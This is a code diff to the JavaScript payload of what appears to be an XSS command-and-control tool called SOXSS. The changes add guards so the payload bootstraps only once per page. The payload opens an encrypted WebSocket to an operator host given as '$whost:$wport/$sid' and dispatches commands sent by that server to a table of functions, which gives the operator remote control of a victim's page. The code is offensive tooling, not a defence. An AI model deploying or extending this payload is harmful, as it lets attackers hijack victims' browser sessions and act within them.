@@ -1,4 +1,9 @@
+var webSocket = window.__SOXSS_SOCKET__ || null;
+
 function sendMessage(msg) {
+    if (!webSocket || webSocket.readyState !== 1) {
+        return;
+    }
     mes = JSON.stringify(msg)
     webSocket.send(encrypt(mes));
 }
@@ -28,23 +33,29 @@ function loadScript(script) {
     node.remove()
 }
 
-const webSocket = new WebSocket("ws://$whost:$wport/$sid");
+if (window.__SOXSS_BOOTSTRAPPED__) {
+    console.info("SOXSS payload already active in this page context.");
+} else {
+    window.__SOXSS_BOOTSTRAPPED__ = true;
+    webSocket = new WebSocket("ws://$whost:$wport/$sid");
+    window.__SOXSS_SOCKET__ = webSocket;
 
-webSocket.onopen = (event) => {
-    // Dynamically load CryptoJS from CDN
-    var cryptoScript = document.createElement("script");
-    cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
-    cryptoScript.onload = function() {
-        if (initCrypto()) {
-            sendMessage({ type: 1 });
-        }
+    webSocket.onopen = (event) => {
+        // Dynamically load CryptoJS from CDN
+        var cryptoScript = document.createElement("script");
+        cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
+        cryptoScript.onload = function() {
+            if (initCrypto()) {
+                sendMessage({ type: 1 });
+            }
+        };
+        cryptoScript.onerror = function() {
+            // Keep connection alive and report load failure through backend once possible.
+            console.error("CryptoJS could not be loaded from CDN.");
+        };
+        document.getElementsByTagName("head")[0].appendChild(cryptoScript);
     };
-    cryptoScript.onerror = function() {
-        // Keep connection alive and report load failure through backend once possible.
-        console.error("CryptoJS could not be loaded from CDN.");
-    };
-    document.getElementsByTagName("head")[0].appendChild(cryptoScript);
-};
+}
 
 /* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
 
@@ -84,20 +95,22 @@ var _webs_Commands_ = {
     }
 }
 
-webSocket.onmessage = (event) => {
-    try {
-        const output = hex2a(decrypt(event.data));
-        let mes = JSON.parse(output)
-        _webs_Commands_[mes["Command"]](mes)
-    } catch (e) {
-        if (useCrypto) {
-            sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } })
-        } else {
-            console.error(e)
+if (webSocket && !webSocket.onmessage) {
+    webSocket.onmessage = (event) => {
+        try {
+            const output = hex2a(decrypt(event.data));
+            let mes = JSON.parse(output)
+            _webs_Commands_[mes["Command"]](mes)
+        } catch (e) {
+            if (useCrypto) {
+                sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } })
+            } else {
+                console.error(e)
+            }
         }
-    }
 
-};
+    };
+}
 
 
 // Criptografía
